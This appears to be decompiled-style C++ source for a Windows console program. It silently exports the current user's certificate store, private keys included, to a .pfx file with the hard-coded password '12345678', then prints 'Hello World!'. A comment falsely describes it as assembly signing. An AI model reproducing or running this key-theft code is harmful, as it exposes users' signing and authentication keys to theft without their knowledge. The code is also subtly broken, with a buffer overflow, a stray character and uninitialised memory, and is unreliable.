// pfx.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#define CERT_STORE_PROV_SYSTEM 10//Initializes the store with certificates,
#define CERT_SYSTEM_STORE_CURRENT_USER_ID 1
#define CERT_SYSTEM_STORE_LOCATION_SHIFT 16
#define CERT_SYSTEM_STORE_CURRENT_USER (CERT_SYSTEM_STORE_CURRENT_USER_ID << CERT_SYSTEM_STORE_LOCATION_SHIFT)
// Set the store location in a
// registry location
#define EXPORT_PRIVATE_KEYS 0x0004

//Open the store with the maximum set of allowed permissions. If this flag is specified, registry stores are first opened with write access and if that fails, they are reopened with read-only access.


typedef struct _CRYPTOAPI_BLOB {
	DWORD cbData;
	BYTE  *pbData;
} CRYPT_INTEGER_BLOB, *PCRYPT_INTEGER_BLOB, CRYPT_UINT_BLOB, *PCRYPT_UINT_BLOB, CRYPT_OBJID_BLOB, *PCRYPT_OBJID_BLOB, CERT_NAME_BLOB, CERT_RDN_VALUE_BLOB, *PCERT_NAME_BLOB, *PCERT_RDN_VALUE_BLOB, CERT_BLOB, *PCERT_BLOB, CRL_BLOB, *PCRL_BLOB, DATA_BLOB, *PDATA_BLOB, CRYPT_DATA_BLOB, *PCRYPT_DATA_BLOB, CRYPT_HASH_BLOB, *PCRYPT_HASH_BLOB, CRYPT_DIGEST_BLOB, *PCRYPT_DIGEST_BLOB, CRYPT_DER_BLOB, PCRYPT_DER_BLOB, CRYPT_ATTR_BLOB, *PCRYPT_ATTR_BLOB;
/*
作为文件形式存在的证书一般有这几种格式：
　　1.带有私钥的证书
　　由Public Key Cryptography Standards #12，PKCS#12标准定义，包含了公钥和私钥的二进制格式的证书形式，以pfx作为证书文件后缀名。
　　2.二进制编码的证书
　　证书中没有私钥，DER 编码二进制格式的证书文件，以cer作为证书文件后缀名。
　　3.Base64编码的证书
证书中没有私钥，BASE64 编码格式的证书文件，也是以cer作为证书文件后缀名。

由定义可以看出，只有pfx格式的数字证书是包含有私钥的，cer格式的数字证书里面只有公钥没有私钥。
*/
FARPROC PFXExportCertStoreEx;
DWORD CertOpenStore; 
FARPROC CertCloseStore;
signed int  PFX()//对assembly进行签名的.防止你的assembly 被替代或者篡改.
{
	HMODULE v0; `
	HANDLE v3; 
	HANDLE v4; 
	LPCVOID v5; 
	HANDLE v6; 
	CHAR FileName;
	
	int v10; 
	
	_CRYPTOAPI_BLOB cryptoapi_blog; 
	LPCVOID lpMem; 

	char path[260];
	GetCurrentDirectory(260,path);

	v0 = LoadLibraryW(L"crypt32.dll");
	CertOpenStore = (DWORD)GetProcAddress(v0, "CertOpenStore");
	CertCloseStore = GetProcAddress(v0, "CertCloseStore");
	PFXExportCertStoreEx = GetProcAddress(v0, "PFXExportCertStoreEx");
	v10 = 0;
	memset(&cryptoapi_blog, 0, 8u);
	if ( PFXExportCertStoreEx )
	{
		if ( CertCloseStore )
		{
			if ( CertOpenStore )
			{//使用指定库类型来打开证书库
	v10 = ((int (WINAPI *)(signed int, DWORD, DWORD, signed int, DWORD))CertOpenStore)(\ 
		CERT_STORE_PROV_SYSTEM, 0, 0, CERT_SYSTEM_STORE_CURRENT_USER, (unsigned long)L"MY");

	int flag = ((int (WINAPI *)(int, PCRYPT_INTEGER_BLOB, DWORD, DWORD, signed int))PFXExportCertStoreEx)\
		(v10,(PCRYPT_INTEGER_BLOB)&cryptoapi_blog,(unsigned long)L"12345678",0,EXPORT_PRIVATE_KEYS); 
	//if (flag )
				{
					v3 = GetProcessHeap();
					lpMem = HeapAlloc(v3, 0x1000u, cryptoapi_blog.cbData);

					cryptoapi_blog.pbData = (BYTE *)lpMem;
					if ( ((int (WINAPI *)(int, PCRYPT_INTEGER_BLOB, DWORD, DWORD, signed int))\
						PFXExportCertStoreEx)(//从证书库中导出证书或证书和私钥
						v10,
						(PCRYPT_INTEGER_BLOB)&cryptoapi_blog,
						(unsigned long)L"12345678",//用来保护私钥的密码，安装导出的pfx证书需要验证该密码。
						0,
						4) )
					{
			
						wsprintfA(&FileName, "%s%d.pfx",path , 77);
						v4 = CreateFileA(&FileName, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
						if ( v4 != (HANDLE)-1 ) 
						{
							CertOpenStore = 0;
							WriteFile(v4, lpMem, cryptoapi_blog.cbData, &CertOpenStore, 0);
							CloseHandle(v4);
						}
					}
				}
			}
		}
	}
	if ( lpMem )
	{
		v5 = lpMem;
		v6 = GetProcessHeap();
		HeapFree(v6, 0, (LPVOID)v5);
	}
	((void (WINAPI *)(int, DWORD))CertCloseStore)(v10, 0);
	lstrcpyA(path, "WORKOK");
	return 1;
}

int main(int argc, char* argv[])
{
	PFX();
	printf("Hello World!\n");
	return 0;
}

